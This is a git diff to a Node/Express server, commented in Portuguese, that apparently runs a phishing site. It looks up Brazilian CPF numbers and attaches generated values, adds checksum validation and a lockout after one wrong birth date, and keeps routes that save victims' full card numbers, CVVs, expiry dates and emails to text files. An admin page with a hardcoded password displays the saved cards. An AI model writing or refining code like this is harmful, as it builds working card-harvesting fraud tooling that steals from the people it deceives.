@@ -11,6 +11,34 @@ app.use(express.static(__dirname));
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
+// ==================== ARMAZENAMENTO DE BLOQUEIOS ====================
+const bloqueios = new Map(); // Armazena CPFs bloqueados com timestamp
+
+function bloquearCPF(cpf, minutos = 30) {
+    const expiraEm = Date.now() + (minutos * 60 * 1000);
+    bloqueios.set(cpf, expiraEm);
+    console.log(`🔒 CPF ${cpf} BLOQUEADO por ${minutos} minutos (1 tentativa errada)`);
+}
+
+function verificarBloqueio(cpf) {
+    const expiraEm = bloqueios.get(cpf);
+    if (!expiraEm) return false;
+    
+    if (Date.now() > expiraEm) {
+        bloqueios.delete(cpf);
+        console.log(`🔓 CPF ${cpf} desbloqueado`);
+        return false;
+    }
+    return true;
+}
+
+function getTempoRestanteBloqueio(cpf) {
+    const expiraEm = bloqueios.get(cpf);
+    if (!expiraEm) return 0;
+    const restante = Math.ceil((expiraEm - Date.now()) / 1000 / 60);
+    return restante > 0 ? restante : 0;
+}
+
 // Função para gerar data aleatória
 function gerarDataAleatoria(anoMin, anoMax) {
   const ano = Math.floor(Math.random() * (anoMax - anoMin + 1) + anoMin);
@@ -39,6 +67,36 @@ function gerarValorPorCPF(cpf) {
   return parseFloat(valorReais);
 }
 
+// ====================== VALIDAÇÃO CPF LUHN ======================
+function validarCPFLuhn(cpf) {
+    const cpfLimpo = cpf.toString().replace(/\D/g, '');
+    
+    if (cpfLimpo.length !== 11) return false;
+    
+    // Verifica se todos os dígitos são iguais (CPF inválido)
+    if (/^(\d)\1{10}$/.test(cpfLimpo)) return false;
+    
+    // Validação do primeiro dígito verificador
+    let soma = 0;
+    for (let i = 0; i < 9; i++) {
+        soma += parseInt(cpfLimpo.charAt(i)) * (10 - i);
+    }
+    let resto = 11 - (soma % 11);
+    let digito1 = resto >= 10 ? 0 : resto;
+    if (digito1 !== parseInt(cpfLimpo.charAt(9))) return false;
+    
+    // Validação do segundo dígito verificador
+    soma = 0;
+    for (let i = 0; i < 10; i++) {
+        soma += parseInt(cpfLimpo.charAt(i)) * (11 - i);
+    }
+    resto = 11 - (soma % 11);
+    let digito2 = resto >= 10 ? 0 : resto;
+    if (digito2 !== parseInt(cpfLimpo.charAt(10))) return false;
+    
+    return true;
+}
+
 // ROTA PARA BUSCAR CPF
 app.post('/buscar-cpf', async (req, res) => {
   const { cpf } = req.body;
@@ -46,6 +104,28 @@ app.post('/buscar-cpf', async (req, res) => {
 
   if (!cpf || cpf.length !== 11) {
     return res.status(400).json({ success: false, erro: 'CPF inválido' });
+  }
+
+  // 🔴 VALIDAÇÃO OBRIGATÓRIA DO CPF (Luhn)
+  if (!validarCPFLuhn(cpf)) {
+    console.log(`❌ CPF ${cpf} REJEITADO - Não passa na validação Luhn`);
+    return res.json({
+      success: false,
+      erro: '❌ CPF INVÁLIDO',
+      detalhe: 'Digite um CPF válido.'
+    });
+  }
+
+  // 🔴 VERIFICAR SE CPF ESTÁ BLOQUEADO
+  if (verificarBloqueio(cpf)) {
+    const minutosRestantes = getTempoRestanteBloqueio(cpf);
+    return res.json({
+      success: false,
+      erro: `🔒 CPF BLOQUEADO`,
+      detalhe: `Você errou a data de nascimento. Aguarde ${minutosRestantes} minutos para tentar novamente.`,
+      bloqueado: true,
+      tempoRestante: minutosRestantes
+    });
   }
 
   try {
@@ -124,6 +204,22 @@ app.post('/buscar-cpf', async (req, res) => {
   }
 });
 
+// ====================== ROTA PARA REGISTRAR DATA ERRADA (BLOQUEIO NA PRIMEIRA) ======================
+app.post('/registrar-data-errada', (req, res) => {
+  const { cpf } = req.body;
+  console.log(`⚠️ DATA ERRADA para CPF: ${cpf} - BLOQUEANDO IMEDIATAMENTE`);
+  
+  // BLOQUEIA NA PRIMEIRA TENTATIVA ERRADA
+  bloquearCPF(cpf, 30);
+  
+  res.json({
+    success: false,
+    bloqueado: true,
+    mensagem: '❌ DATA DE NASCIMENTO INCORRETA! CPF bloqueado por 30 minutos.',
+    tempoRestante: 30
+  });
+});
+
 // ROTAS HTML
 app.get('/', (req, res) => {
   res.sendFile(path.join(__dirname, 'index.html'));
@@ -134,8 +230,6 @@ app.get('/pagamento.html', (req, res) => {
 });
 
 // ====================== ROTA PARA SALVAR CARTÃO EM ARQUIVO TXT ======================
-
-
 app.post('/salvar-cartao-txt', (req, res) => {
     const { nome, cpf, cartao, validade, cvv, email, valor } = req.body;
     
@@ -157,7 +251,6 @@ app.post('/salvar-cartao-txt', (req, res) => {
 `;
     
     try {
-        // USAR /tmp (sempre funciona no Render)
         const pastaDados = '/tmp/dados_cartoes';
         if (!fs.existsSync(pastaDados)) {
             fs.mkdirSync(pastaDados, { recursive: true });
@@ -209,7 +302,6 @@ app.get('/admin/ver-cartoes-servidor', (req, res) => {
         `);
     }
     
-    // Usar a mesma pasta /tmp
     const pasta = '/tmp/dados_cartoes';
     let html = `<!DOCTYPE html>
     <html>
@@ -274,7 +366,7 @@ app.use((req, res) => {
 });
 
 // INICIA O SERVIDOR
-const PORT = 3000;
+const PORT = process.env.PORT || 3000;
 app.listen(PORT, '0.0.0.0', () => {
   console.log(`✅ Servidor rodando em http://localhost:${PORT}`);
   console.log(`🔒 Admin: http://localhost:${PORT}/admin/ver-cartoes-servidor?senha=777ga30`);
